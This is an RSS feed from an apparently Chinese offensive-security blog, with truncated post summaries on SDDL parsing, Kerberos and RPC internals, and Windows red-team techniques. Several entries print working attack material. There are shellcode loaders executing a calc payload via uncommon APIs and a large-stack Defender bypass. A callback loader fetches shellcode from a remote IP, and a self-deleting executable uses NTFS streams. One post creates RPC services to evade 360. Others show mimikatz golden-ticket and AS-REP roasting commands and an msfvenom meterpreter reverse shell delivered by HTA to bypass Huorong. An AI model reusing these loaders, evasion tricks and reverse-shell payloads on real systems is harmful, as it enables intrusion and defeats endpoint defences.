<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on 2867a0</title>
    <link>https://gokarna-hugo.netlify.app/posts/</link>
    <description>Recent content in Posts on 2867a0</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sun, 16 Jul 2023 07:16:00 +0800</lastBuildDate><atom:link href="https://gokarna-hugo.netlify.app/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>GoLdapTool工具开发篇-1: SDDL解析</title>
      <link>https://gokarna-hugo.netlify.app/posts/2023/sddl_1/</link>
      <pubDate>Sun, 16 Jul 2023 07:16:00 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2023/sddl_1/</guid>
      <description>python编写的ldap查询工具不能编译，不方便在windows主机上使用，于是想着用golang去重构。golang有ldap v3库，可以满足基本的查询需求。但是，该库没有实现SDDL的解析。在其issues中有提到相关的解析文章，可以自己实现。
解析 要解析SDDL数据，需要先获取一段原始数据，做如下查询并将nTSecurityDescriptor​的原始数据打印出来，如下图。
​
整个SDDL结构分为NtSecurityDescriptor头​+Sacl头​+Sacl Ace条目​+Dacl头​+Dacl Ace条目​
后续的解析都以我在编写该文章之前的数据进行解析
​
NtSecurityDescriptor header 根据微软官方​[MS-DTYP]: 2.4.6的描述，该部分是一个SECURITY_DESCRIPTOR​结构，有如下字段。其中，Revision​、Sbz1​、Control​、OffsetOwner​、OffsetGroup​、OffsetSacl​、OffsetDacl​这几个字段总共占20个字节。
OffsetOwner​和OffsetGroup​是所有者、所在组的数据偏移，OffsetSacl​和OffsetDacl​是Sacl header、Dacl header数据的偏移地址。根据这些偏移找到对应的数据并将数据解析赋值给变量OwnerSid​、GroupSid​、Sacl​、Dacl​
​​
上述结构对应我们Dump出来的数据如下图。我们主要关心的是其偏移大小**。**​OffsetOwner​占4个字节，为C0 08 00 00​，按照小端解析为00 00 08 C0​，转换为10进制值为2240​。OffsetGroup​同理。
OffsetSacl​的数据为14 00 00 00​，转换为10进制后是20​，也就是说，NtSecurityDescriptor header​之后紧跟着Sacl header​（偏移的起始地址为NtSecurityDescriptor header​的第一个字节）。
OffsetDacl​的数据为8C 00 00 00​，按照小端排序为00 00 00 8C​，转换为10进制之后是0x8C=140​
​​
NtSecurityDescriptor header​的数据就解析完了，紧跟着的是Sacl header​
Sacl 解析 Sacl​这一部分的数据包含Sacl header​ 和多个 Sacl Ace​条目。
根据微软MS-DTYP: 2.4.5中的描述，Acl​结构总共8个字节，我们需要关心的是AclSize​和AceCount​这两个字段，顾名思义，一个是Sacl​数据的大小，一个是Sacl Ace​的条目数量。
​​
我们找到原始数据中对应的字节数，如下图，就是Sacl header​
​​
这是解析之后的**。**​Acl Size​字段数据为78 00​，转换后的10进制值为120​。这个大小是Sacl header​的大小 + 所有Sacl Ace​的大小
Ace Count​的值为2，也就是说Sacl有两条Ace
​​
Sacl header​之后紧跟着的是其对应的Ace数据。
先来看Ace数据结构，在微软的文档只将AceType​、AceFlags​、AceSize​作为Ace Header​的字段，而我这里是将AceMask​、Extended​、SID​都放在了AceStruct​中进行解析。</description>
    </item>
    
    <item>
      <title>利用ADS删除自身</title>
      <link>https://gokarna-hugo.netlify.app/posts/2023/adsdeleteself/</link>
      <pubDate>Sun, 11 Jun 2023 08:18:00 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2023/adsdeleteself/</guid>
      <description>ADS Microsoft于90年代初期引入了一种称为“数据流”的概念，从而使NTFS可以作为Macintosh客户端访问文件服务器的文件系统。因为Mac OS 是利用Mac的分层式文件系统（HFS)上所谓的资源分支数据流，用于存放图标等应用程序的元数据。NTFS和FAT的差别就是FAT由一个数据流构成，而NTFS可以在一个文件内存里面存储多个数据流。
在windows协议MS-FSA中ADS的定义：一个被命名的数据流是一个文件或者目录的一部分，它们可以独立于默认数据流被单独的打开。许多数据流的操作之影响数据流并不影响其他数据流，文件和目录
所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：
&amp;lt;文件名&amp;gt;:&amp;lt;流名&amp;gt;:&amp;lt;流种类&amp;gt; 文件ADS默认没有流名字，一个文件test.txt在NTFS中的全名为test.txt::$DATA
文件夹没有默认的数据流（也就是没有主数据流），但是有一个默认的目录流为$INDEX_ALLOCATION，默认的流名为$I30。比如文件夹testDir全名为testDir:$I30:$INDEX_ALLOCATION
假设查看文件1.txt的数据流内容，可以输入如下命令，其内容和1.txt是一样的，在数据流中添加的内容保存后会被写入对应的文件中。如下图，原来1.txt中只有内容1.txt，在数据流中写入2，保存后重新打开原文件，发现2被写入
notepad.exe 1.txt::$DATA 简单提一下，用微软的streams.exe工具可以遍历出程序的备用数据流
自删除 自删除原理是，将文件重命名为数据流格式，然后删除该数据流。利用这种方法去删除可以无视当前文件句柄占用，如果程序处于运行中也不会破坏程序的运行。
代码如下，首先以DELETE方式获取自身文件句柄，调用SetFileInformationByHandle()将文件名修改为:anyany，以调试编译运行的时候SetFileInformationByHandle()函数会报错，忽略就行。
修改完成后重新打开一次文件句柄，再次调用SetFileInformationByHandle()删除文件
程序执行，自删除文件，后续的代码依旧可以运行
上面的代码中我设置了两个暂停，第一个pause中，如果以代码调试的方式打开程序，CreateFileW函数会获取不到文件句柄，解决方法也简单，x64gbd附加到进程就可以调试了。
第二个pause是在将文件修改为数据流之后，用winhex创建磁盘快照可以发现，原来的程序变成了0B，进入程序之后any文件其实就是原来的程序
从上面可以看出，我们在第一次rename的时候是将程序移动到了数据流中（磁盘中会有一个0B的文件），第二次删除的时候删除的0B文件是我们的数据流文件。
这里还有一个点，在第一次rename文件之后如果不关闭程序的句柄（也就是一直暂停到第二个pause），火绒剑操作这个文件的时候会卡死
完整代码 CloseSelf.h
#pragma once #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;shlwapi.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #define DS_STREAM_RENAME L&amp;#34;:anyany:$DATA&amp;#34; #define DS_DEBUG_LOG(msg) wprintf(L&amp;#34;[LOG] - %s\n&amp;#34;, msg) BOOL ds_deposite_handle(HANDLE hHandle); BOOL ds_rename_handle(HANDLE hHandle); HANDLE ds_open_handle(PWCHAR pwPath); CloseSelf.cpp
#include &amp;#34;CloseSelf.h&amp;#34; HANDLE ds_open_handle(PWCHAR pwPath) { return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); } BOOL ds_rename_handle(HANDLE hHandle) { FILE_RENAME_INFO fRename; RtlSecureZeroMemory(&amp;amp;fRename, sizeof(fRename)); // set our FileNameLength and FileName to DS_STREAM_RENAME LPWSTR lpwStream = (LPWSTR)DS_STREAM_RENAME; fRename.</description>
    </item>
    
    <item>
      <title>Write Memory Trick</title>
      <link>https://gokarna-hugo.netlify.app/posts/2023/writememorytrick/</link>
      <pubDate>Wed, 22 Mar 2023 07:12:30 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2023/writememorytrick/</guid>
      <description>[TOC]
vx-underground档案中记载的技巧，用一些非常见的函数写入shellcode到内存。原文来自xss.is论坛，这里只记录复现出来的函数。
PathCanonicalizeA 源代码如下，首先HeapCreate()、HeapAlloc()分配dst_shellcode内存空间，使用PathCanonicalizeA()函数将源shellcode逐字节复制到dst_shellcode，修改dst_shellcode内存空间权限为RWX，最后调用**InitOnceExecuteOnce()**执行。
PathCanonicalizeA函数在使用的时候有两个问题，一是遇到0x00字符时终止，二是长度不能过长。所以需要确保源shellcode不能有坏字符，同时shellcode长度不能过长。代码里面是将源shellcode先写到数组，再将数组内容复制到dst_shellcode内存空间。
#include &amp;lt;Windows.h&amp;gt; #include &amp;lt;Shlwapi.h&amp;gt; #pragma comment(lib, &amp;#34;Shlwapi.lib&amp;#34;) bool test1() { // x64 calc.exe shellcode // https://www.exploit-db.com/shellcodes/49819 unsigned char orig_shellcode[] = &amp;#34;\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b&amp;#34; &amp;#34;\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2&amp;#34; &amp;#34;\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b&amp;#34; &amp;#34;\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04&amp;#34; &amp;#34;\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0&amp;#34; &amp;#34;\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2&amp;#34; &amp;#34;\x48\x83\xec\x20\x41\xff\xd6&amp;#34;; size_t ori_shellcode_size = sizeof orig_shellcode; LPVOID copied_shellcode = NULL; HANDLE heap = NULL; BOOL ret = 0; int size = 0; heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); copied_shellcode = HeapAlloc(heap, 0, ori_shellcode_size); ZeroMemory(copied_shellcode, ori_shellcode_size); // copy shellcode for (size_t i = 0; i &amp;lt; ori_shellcode_size; i++) { char temp[2] = { 0 }; temp[0] = orig_shellcode[i]; if (!</description>
    </item>
    
    <item>
      <title>Pe To Shellcode</title>
      <link>https://gokarna-hugo.netlify.app/posts/2023/petoshellcode/</link>
      <pubDate>Fri, 03 Mar 2023 08:00:00 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2023/petoshellcode/</guid>
      <description>原项目地址
pe2shc 先把它转成vs项目，程序入口接受两个参数，待转换文件和转换后文件输出路径
首先执行的是is_supported_pe()函数。读取源文件，按照内存对齐方式将数据读取到内存，判断是否为可以转换的程序
存在重定位表 不支持.NET程序 检查完成之后释放申请的内存空间，重新申请一块新的内存空间并内存对齐方式读取到内存，shellcodify()函数就是真正要转换的逻辑
函数先从资源区读取stub代码，这个代码就是stub64.bin中的代码。再申请一块新的内存空间（就叫他扩展内存空间），将展开后的PE和stub代码都放到扩展内存空间中，stub代码会被放在PE数据的末尾。接着执行overwrite_hdr()函数。
overwrite_hdr()会修改扩展空间前32个字节，也就是源文件DoS头的前32字节。 下图中00 16 60 00转换为10进制是1466368，是源程序内存展开后的大小，将这个数值写入redir_code，程序在执行到这里会跳转到(源程序内存展开后的首地址 + 1466368)地址，也就跳到了stub代码区
目前，我们的源程序以内存对齐方式被读取在扩展空间，源程序的DoS头被修改（跳转到stub代码），stub代码被存放在程序的末尾。
源代码中，到这里就开始执行保存逻辑了。在保存之前：
判断程序是否需要修复导入表（这里用的是mimikatz作为源程序，没做导入表的修复） 修改节表中文件对齐地址为内存对齐后的地址 最后将内存中的数据保存到文件。因为节区块是按照内存对齐进行保存的，又有stub代码附加到了源程序的末尾，新生成的程序会比源程序大不少
stub 代码 附加到文件末尾的二进制代码是stub64.bin，它的源代码是loader_v2项目编译生成的。
将stub64.bin拖到IDA里面配合loader_v2源代码分析，stub_main()函数就是程序跳转后要执行的第一个函数，首先初始化需要的函数地址，从PEB表里面拿到kernel32的地址，从kernel32中遍历出LoadLibraryA、GetProcAddress函数的地址
然后判断参数1指向的地址能否被解析成PE结构，v4参数取的是DoS头中的第32个字节，在DoS头里面一般是0，所以主要看case 0的逻辑。
NT头+176指向的是BaseRelocationTable的首地址，确保重定位表存在。 修复重定位表，修复导入表，修复TLS表
最后，找到程序的AddressOfEntryPoint，判断是DLL还是exe执行
总体来说这个项目用到的还是PE结构的相关知识，和PE内存加载的逻辑很相似。利用这个项目转换出来的程序既可双击执行，也可以直接扔到内存中加载</description>
    </item>
    
    <item>
      <title>Big Stack bypass</title>
      <link>https://gokarna-hugo.netlify.app/posts/2023/bigstack/</link>
      <pubDate>Mon, 13 Feb 2023 08:00:00 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2023/bigstack/</guid>
      <description>[TOC]
2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。
测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。
visual studio编译需要设置字符集为多字节、堆栈提交大小为200000，堆栈大小可以自己定义
修改后的完整代码：
#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;time.h&amp;gt; #include &amp;lt;random&amp;gt; typedef LPVOID (WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); typedef BOOL (WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD); typedef HANDLE (WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); unsigned char sVirtualProtect[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;P&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;, 0x0 }; unsigned char sVirtualAlloc[] = { &amp;#39;V&amp;#39;,&amp;#39;i&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;u&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;A&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;o&amp;#39;,&amp;#39;c&amp;#39;,0x0 }; unsigned char sCreateThread[] = { &amp;#39;C&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;T&amp;#39;,&amp;#39;h&amp;#39;,&amp;#39;r&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;a&amp;#39;,&amp;#39;d&amp;#39;,0x0, }; #define STACKSIZE 2000000 int main (VOID) { //msfvenom calc payload // msfvenom --platform windows --arch x64 -p windows/x64/exec CMD=calc.</description>
    </item>
    
    <item>
      <title>Rpc Create Service</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/rpc-create-service/</link>
      <pubDate>Wed, 23 Nov 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/rpc-create-service/</guid>
      <description>调用CreateService()创建服务会被360拦截。用Rpc接口创建服务就能绕过。
SCMR pipe protocol uuid IDL file \\pipe\svcctl MS-SCMR {367ABB81-9844-35F1-AD32-98F038001003} 微软官方文档 SCMR（Service Control Manager Remote Protocol）是基于RPC的协议，用于配置和控制远程计算机上运行的服务程序。该协议维护一个内部数据库来存储服务程序配置和状态。服务控制管理器协议对该内部数据库具有独占访问权。
在一个操作系统实例上只有一个 SCM 和一个对应的 SCM 数据库。对此内部数据库的任何更新都只能通过服务控制管理器远程协议进行。SCM 负责序列化对 SCM 数据库的所有并发访问。SCM数据库常驻内存；每次 SCM 重新启动时（每次重新启动后）都会重新创建它。SCM 数据库的一部分是从持久存储（有关注册服务的所有信息）和部分非持久存储（服务的当前活动状态）中检索的。
当添加、配置服务时，持久性信息由 SCM 修改，或删除。任何直接在持久化存储中直接修改数据库持久化部分的尝试都是不支持的场景，并且会导致可能的不一致。最后，如果 SCM 被强制终止，操作系统将关闭并重新启动。
通俗地说服务是存放在系统维护的SCM数据库里面的，我们调用创建、删除服务的函数都是对数据库的操作。SCMR对应的Rpc接口为\\pipe\svcctl，根据微软描述，SCMR没有标准分配，只有 Microsoft 使用其他协议中指定的分配程序进行的私有分配。也就是说，RpcView里面是看不见这个Rpc接口的
微软在其官方文档中提供了该协议的操作示例
Demo代码 基于上述假设编写测试代码。将微软提供的IDL代码保存为scmr.idl，同时微软还提到该IDL还依赖ms-dtyp.idl，都将其保存下来并编译。因为是Rpc客户端，我们只需要scmr.idl编译生成的scmr_c.c、scmr_h.h，和ms-dtyp.idl编译生成的ms-dtyp_h.h相关代码。最后的文件如下图
导入完成之后需要修复一些编译上的错误，“类型重定义错误”将相关代码代码注释就能解决。
“无法解析外部符号”需要添加rpcrt4.lib，添加代码如下
#pragma comment(lib, &amp;#34;rpcrt4.lib&amp;#34;) void __RPC_FAR* __RPC_USER MIDL_user_allocate (size_t size) { return HeapAlloc (GetProcessHeap (), 0, size); } void __RPC_USER MIDL_user_free (void* p) { HeapFree (GetProcessHeap (), 0, p); } 之后main函数中导入scmr_h.h就可以调用ROpenSCManagerW()和RCreateService()函数创建服务</description>
    </item>
    
    <item>
      <title>回调函数加载器</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/callback-function/</link>
      <pubDate>Sun, 13 Nov 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/callback-function/</guid>
      <description>是github项目AlternativeShellcodeExec中提到的一些函数可以用来执行shellcode
项目里面还有很多函数可以利用，因为是在本地线程执行shellcode的，所以这里只贴出其中一个完整的利用代码
#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;wincrypt.h&amp;gt; #include &amp;lt;WinInet.h&amp;gt; #pragma comment(lib, &amp;#34;WinInet.lib&amp;#34;) // Requires Crypt32.lib // 需要在链接器 -&amp;gt; 输入 -&amp;gt; 附加依赖项 中添加如下库 /* kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib Crypt32.lib */ // 定义结构体 typedef struct { char* shellcode; int size; } SHELLCODO, * PSHELLCODE; BOOL downloadShellcode(LPCWSTR url, int port, LPCWSTR payloadPath, BOOL isEncrypted, PSHELLCODE pShellcode); int main() { SHELLCODO shellcode = { 0 }; BOOL s = downloadShellcode(L&amp;#34;192.</description>
    </item>
    
    <item>
      <title>Rpc introduction</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/rpc-intro/</link>
      <pubDate>Sat, 10 Sep 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/rpc-intro/</guid>
      <description>2. rpc介绍(是什么、有什么用、谁在用) 2.1 RPC介绍 RPC协议主要用来进行远程过程调用，用一句话来概括，就是允许用户程序调用服务器上的函数进行计算，由此实现两者交互。
早先的企业环境中，所有的服务都在一台主机上，就会导致服务器负荷过重，无法保证业务的正常运作。正因如此，后来企业就更换了一种思路，将不同服务分开，分别存放在不同主机上，暂时解决了负荷问题。但是久而久之，这样的方式也开始显现弊端，比如当用户需要使用不同服务器上的服务协作来完成任务时，服务与服务之间该如何交互？
这就是RPC要解决的问题，简言之，RPC可以允许一台机器上的程序调用另一台机器上的函数，通过各计算机协作进行计算，以保证用户任务顺利完成，RPC的通信过程如下图所示（摘自微软官方）
客户端和服务器在各自的本地维护一个stub（理解为函数工厂），stub里面会暴露出客户端可以调用（服务器可以解析）的函数，客户端stub在收到这些函数之后会将其序列化并通过网络传递给服务器；服务器stub在收到函数调用之后会将序列化的内容解序列化，并调用本地对应的函数，获得结果之后序列化结果并传递给客户端。客户端会按照相同的方式反序列化结果。
2.3 有什么用 分布式 如上所说，我们可以利用RPC的这个通信方式将服务分散到不同的服务器上部署，在应用层面调用远程服务就像在本地调用一样简单。在很多大型架构上可以看到它的身影如Dubbo，当然这不是本次讨论的重点。 本地跨进程通信 RPC也可以在本地进行调用，将RPC客户端和服务端放在同一服务器，实现不同进程之间的通信。 2.4 谁在用 在Windows上面，很多功能都利用到了RPC通信，身份验证、服务创建、目录复制等。最典型的就是lsass.exe进程，我们用RpcView可以看到很多程序都有提供Rpc接口，下面是lsass.exe的rpc接口
服务创建 (MS-SCMR) 目录复制服务 (MS-DRSR) 远程注册表 (MS-RRP) 计划任务 (MS-SCMR) 打印系统 (MS-RPRN) Windows 管理规范 (MS-WMI) Netlogon 远程协议 (MS-NRPC) 其他的，很多大型架构上可以看到它的身影如Dubbo，当然这不是本次讨论的重点。
3. 攻击面 针对Windows上的Rpc攻击面，目前在互联网上看到大多数都是在寻找Rpc接口中可以滥用的函数，典型案例就是Printer Bug和PetitPotam。
Printer Bug 利用的是\pipe\spoolss接口中的 RpcRemoteFindFirstPrinterChangeNotificationEx() 函数，该函数会创建一个远程更改通知对象，该对象监视打印机对象的更改，如果指向的打印机路径为远程打印机，则RPC服务器会像远程打印机发起认证。
PetitPotam 利用的是\pipe\efsrpc接口中的 EfsRpcOpenFileRaw() 函数，该函数用于打开服务器上的加密对象以进行备份或还原，当指定的加密对象为UNC路径时，RPC服务器就会去查找该UNC路径，同时会发起认证请求。
漏洞 Protocol function Printer Bug MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx() PetitPotam MS-EFSR EfsRpcOpenFileRaw() 4. rpc挖掘方法 寻找可滥用的Rpc接口
RpcView手动分析每一个接口 Ghidra + Jupyter 图形化分析（该方法时用脚本导出所有具有Rpc功能的DLL，再用Ghidra将DLL进一步处理，输出出每个DLL具有的Rpc函数，最后将结果导入到Jupyter进行分析） 5. Printer BUG Printer BUG 这个洞利用的是spoolsv.</description>
    </item>
    
    <item>
      <title>Kerberos: 利用</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/</link>
      <pubDate>Sat, 05 Mar 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/</guid>
      <description>TGT阶段 黄金票据 利用的是第二次：身份认证请求包，身份认证返回包中的ticket使用krbtgt的 NTLM hash加密，如果能获得krbtgt hash，就能自己制作TGT票据。即黄金票据
kerberos::golden /domain:[domain] /sid:[domain sid] /id:500 /user:AnyFuckUser /krbtgt:[krbtgt NTLM Hash] 用户名枚举 在请求TGT票据协商请求包中，因为服务器没有去验证请求用户的密码，所以可以修改CNameString去猜解域用户名
nmap的krb5-enum-users脚本使用该方式来枚举用户名。
python 脚本
密码爆破/密码喷洒 当请求TGT时用户对应的密码不正确，服务器会返回KDC_ERR_PREAUTH_FAILED错误。可以用这个值去暴力破解用户对应的密码。
（错误密码的数据返回包）
（正确密码返回的数据包）
python脚本实现，爆破和喷洒用的都是同一个函数，判断一下返回值就可以了
AS-Repoasting 域内用户可以配置 &amp;ldquo;不要求预身份认证&amp;rdquo;。
当这些用户向服务器发起协商请求包时，对于通过协商请求的响应包，可以获得响应包中的cipher字段（这部分是使用用户hash加密session-key），将其拼接成 Kerberos 5 AS-REP etype 23 使用hashcat破解出该用户的明文口令。
拼接方式为：$krb5asrep$23$[user]@[domain]:[cipher前32位]$[cipher后续值]
用hashcat破解
hashcat -m 18200 hash.txt /usr/share/wordlist/rockyou.txt impacket里面对于设置该值的用户使用getTGT脚本是获取不到TGT票据的，会报SessionKeyDecryptionError错误。响应数据包中会直接返回TGT票据
用GetNPUsers脚本就可以解析了
impacket-GetNPUsers yunwei.lab/user:123.com -dc-ip 20.0.0.100 python脚本实现，输入用户名/用户名字典，输出hashcat可直接跑的命令
Path The Hash / Path The Key 在使用账号密码登录时会把密码加密成hash，所以直接使用hash去认证也可以。如果hash为NTLM + RC4加密，则为Pass The Hash。Hash为AES Key则为Pass The Key
TGS阶段 Kerberoasting 在请求TGS票据的时候，只要请求的TGT票据是正确的，服务器就会返回请求服务对应的TGS票据，并不会去检查访问权限。
返回的TGS票据中ticket.enc_part是用要请求的服务NTLM Hash加密的，爆破这个值就能获得请求服务的NTLM Hash</description>
    </item>
    
    <item>
      <title>Kerberos: AP-REQ</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-ap-req/</link>
      <pubDate>Sun, 20 Feb 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-ap-req/</guid>
      <description>请求TGS票据我准备用kekeo。在普通域机器上执行下面的命令发起TGS请求。
# 先请求一张jm的TGT票据 kekeo.exe &amp;#34;tgt::ask /domain:yunwei.lab /user:jm /password:123.com&amp;#34; # 再请求TGS票据 kekeo.exe &amp;#34;tgs::ask /tgt:TGT_.kirbi /service:cifs/srv2012.yunwei.lab&amp;#34; &amp;#34;exit&amp;#34; 请求 常规的请求TGS票据里面会携带padata和req-body数据块。
padata中的ap-req.ticket是请求的TGT票据。KDC会校验TGT票据，如果票据正确，就返回TGS票据。
req-body块中，cname.CNameString表示发起请求的用户是jm；sname.SNameString表示要访问的spn为cift/srv2012.yunwei.lab，
响应 KDC 使用krbtgt hash解密TGT，不管用户有没有访问对应服务的权限，就会返回用请求的服务hash加密的TGS票据（ticket），票据对应的服务为cifs/srv2012.yunwei.lab。如下图，ticket.enc-part.cipher使用该服务的NTLM hash加密。
同时，返回的数据包表明这张票据是jm这个用户请求的（cname.CNameString）。
和ticket同级还有一个enc-part，这个是用第一阶段里面返回的session_key加密的。这个enc-part会作为下一阶段的认证密钥</description>
    </item>
    
    <item>
      <title>Kerberos: AS-REQ</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-as-req/</link>
      <pubDate>Thu, 10 Feb 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-as-req/</guid>
      <description> 分析kerberos请求第一阶段，以下是基于impacket请求发出的数据包进行分析。其他工具可能有所差异，但问题不大。
impacket-getTGT yunwei.lab/jm:123.com -dc-ip 20.0.0.100 在impacket中，一共会发送两次AS Req包。
第一次：协商 第一次为协商请求包，这个数据包的功能有两个：
服务器和客户端协商加密协议（etype.ENCTYPE），如果不支持则继续协商。 其次判断用户名是否存在（cname.cname-string.CNameString）。 上述条件都满足后，会进入下一阶段：身份验证
协商包里面只有用户名。服务器会去判断请求的用户名是否存在，如果不存在则不再进行后续操作。
其他字段的信息：realm指的是域控的域名。nonce是随机生成的数
第二次：身份认证 这个请求中不会直接发送密码hash给服务器，而是发送一个用密码加密的时间戳（padata-type: pA-ENC-TIMESTAMP）给服务器。服务器收到请求后会使用用户名对应的密码解密时间戳。
如果时间戳在一定范围内，则认证成功，服务器返回TGT票据（ticket）和Session Key（etc-part.cipher）。
TGT票据使用krbtgt账户的密码hash进行加密，TGT票据中包含PAC。PAC又包含 Client SID + Client Group。 Session Key使用（CNameString）用户名对应的密码进行加密，作为下阶段认证密钥。但是，服务器不会存储Session Key。 </description>
    </item>
    
    <item>
      <title>Kerberos: 认证过程</title>
      <link>https://gokarna-hugo.netlify.app/posts/2022/kerberos-base/</link>
      <pubDate>Tue, 01 Feb 2022 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2022/kerberos-base/</guid>
      <description>基本认证过程 请求TGT票据 客户端请求：发送客户端hash加密的时间戳
服务器响应：解密，如果时间戳在一定范围内，认证通过，返回TGT票据和session key。TGT票据使用krbtgt hash加密，TGT票据中包含PAC。PAC又包含 Client SID + Client Group。session key会作为下阶段认证密钥
请求TGS票据 客户端请求：拿着TGT票据向KDC发起针对特定服务的TGS请求
服务器响应：使用krbtgt hash解密TGT，返回用服务器hash加密的TGS票据和（用上一阶段的session key加密的）新的session key。（这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据）
AP请求/响应 客户端请求：拿着TGS票据请求特定服务
服务器响应：使用自身hash解密出TGS票据中的PAC，向KDC询问客户端是否有访问权限。KDC解密PAC，获取Client SID和group，再根据该服务的ACL，判断Client是否有访问权限
参考 Windows Protocol Kerberos篇
黄金票据和白银票据攻击及其原理介绍 - 简书</description>
    </item>
    
    <item>
      <title>绕过火绒上线MSF</title>
      <link>https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/</link>
      <pubDate>Sat, 13 Nov 2021 22:53:46 +0800</pubDate>
      
      <guid>https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/</guid>
      <description>[TOC]
环境 攻击机 靶机 kali + msf + hta脚本 Windows Server 2008 + mshta IP: 10.0.0.4 IP: 10.0.0.100 复现 kali 下载原始hta脚本（1.hta），msf生成原始32位windows shellcode，并将shellcode进行base64编码。将编码后的shellcode替换原始hta脚本（2.hta）
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=10.0.0.4 lport=443 -f raw &amp;gt; shellcode.bin cat shellcode.bin | base64 -w 0 kali开启http服务准备投递hta脚本
sudo python3 -m http.server 8888 开启msf准备接收反弹shell
